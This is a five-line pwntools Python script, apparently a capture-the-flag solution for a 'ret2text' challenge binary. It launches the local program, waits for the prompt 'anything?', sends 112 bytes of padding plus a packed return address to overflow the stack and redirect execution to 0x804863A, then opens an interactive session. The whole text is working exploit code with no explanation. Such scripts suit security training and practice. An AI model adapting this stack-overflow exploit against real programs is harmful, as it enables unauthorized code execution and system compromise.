from pwn import *
p = process('./ret2text')
addr = 0x804863A
p.sendlineafter("anything?",b'a'*112+p32(addr))
p.interactive()